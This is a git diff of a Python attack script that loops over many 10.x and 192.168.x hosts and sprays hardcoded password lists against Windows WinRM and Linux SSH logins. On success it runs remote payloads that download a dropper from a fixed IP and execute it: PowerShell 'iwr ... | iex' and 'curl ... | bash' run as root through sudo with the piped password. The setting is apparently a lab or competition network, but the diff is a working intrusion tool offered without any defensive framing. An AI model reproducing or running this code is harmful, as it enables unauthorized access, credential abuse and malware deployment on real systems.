@@ -1,6 +1,7 @@
 import winrm
 import re
 import paramiko
+import subprocess
 
 # Fixes PyWinRM ipv6 issue (Shoutout illidian80 on github)
 _original_build_url = winrm.Session._build_url
@@ -49,11 +50,17 @@ def create_linux_session(host, username, password):
 
 def windows_execute(session):
     ps_script = 'iwr http://192.168.14.3/download/dropper.ps1 | iex'
+    ps_script = "whoami"
     output = session.run_cmd(f'powershell -c "{ps_script}"')
+    print(output.std_out.decode())
 
-def linux_execute(session):
-    stdin, stdout, stderr = session.exec_command("curl http://192.168.14.3/download/dropper.sh | bash")
-    
+def linux_execute(username, password, host):
+    # stdin, stdout, stderr = session.exec_command("curl http://192.168.14.3/download/dropper.sh | bash")
+    # replace command with command to run, it gets run as sudo
+    command = "curl -s http://192.168.1.51:443/dropper.sh|bash"
+    output = subprocess.run(f"SSHPASS={password} sshpass -e ssh -t {username}@{host} 'echo \"{password}\" | sudo -S {command}'", capture_output=True, text=True, shell=True)
+
+    print(f"Output: {output.stdout.split(f'[sudo] password for {username}:')[1].strip()}")
 
 def main():
     for i in range(1, 18):
@@ -72,7 +79,6 @@ def main():
             f"10.{i}.1.5",
             f"10.{i}.1.6",
             f"10.{i}.1.7",
-            f"10.{i}.1.8",
             f"192.168.{i}.3",
             f"192.168.{i}.4",
             f"192.168.{i}.5"
@@ -80,10 +86,16 @@ def main():
 
         windows_domain_admin = "admiral"
 
-        windows_credentials = [
+        windows_domain_credentials = [
             "nosferatu",
             "letredin",
             "admiral",
+            ""
+        ]
+
+        windows_local_credentials = [
+            "nosferatu",
+            "letredin",
             "captain",
             ""
         ]
@@ -92,37 +104,53 @@ def main():
 
         linux_credentials = [
             "captain",
-            "letredin",
             "nomnom",
             "father",
             ""
         ]
 
-        # for host in windows_machines:
-        #     print(f"Attacking {host}...")
-        #     found_session = False
-        #     for password in windows_credentials:
-        #         if not found_session:
-        #             session = create_windows_session(host, f"{domain}\\{windows_domain_admin}", password)
-        #             if session is not None:
-        #                 found_session = True
-        #                 print(f"Executing PS payload against {host}")
-        #                 windows_execute(session)
-        #             else:
-        #                 session = create_windows_session(host, local_admin, password)
-        #                 if session is not None:
-        #                     found_session = True
-        #                     print(f"Executing PS payload against {host}")
-        #                     windows_execute(session)
-        linux_machines = ["192.168.1.54"]
+        for host in windows_machines:
+            print(f"Attacking {host}...")
+            found_session = False
+            for i in range(len(windows_local_credentials)):
+                password = windows_local_credentials[i]
+                if not found_session:
+                    try:
+                        print(f"Trying {local_admin}:{password} on {host}")
+                        session = create_windows_session(host, local_admin, password)
+                        session.run_cmd(f'powershell -c "whoami"')
+                        print(f"Found valid credentials! {local_admin}:{password} on {host}")
+                        found_session = True
+                        print(f"Executing PS payload against {host}")
+                        windows_execute(session)
+                    except Exception:
+                        try:
+                            password = windows_domain_credentials[i]
+                            print(f"Trying {domain}\\{windows_domain_admin}:{password} on {host}")
+                            session = create_windows_session(host, f"{domain}\\{windows_domain_admin}", password)
+                            session.run_cmd(f'powershell -c "whoami"')
+                            print(f"Found valid credentials! {domain}\\{windows_domain_admin}:{password} on {host}")
+                            found_session = True
+                            print(f"Executing PS payload against {host}")
+                            windows_execute(session)
+                        except Exception:
+                            continue                
+
+
         for host in linux_machines:
+            found_credentials = False
             print(f"Attacking {host}...")
             for password in linux_credentials:
                 try:
-                    session = create_linux_session(host, local_admin, password)
-                    if session is not None:
-                        print(f"Executing bash payload against {host}")
-                        linux_execute(session)
+                    if not found_credentials:
+                        print(f"Trying {local_admin}:{password} on {host}")
+                        session = create_linux_session(host, local_admin, password)
+                        if session is not None:
+                            print(f"Found valid credentials! {local_admin}:{password} on {host}")
+                            print(f"Executing bash payload against {host}")
+                            found_credentials = True
+                            linux_execute(local_admin, password, host)
+                        session.close()
                 except Exception:
                     continue
 
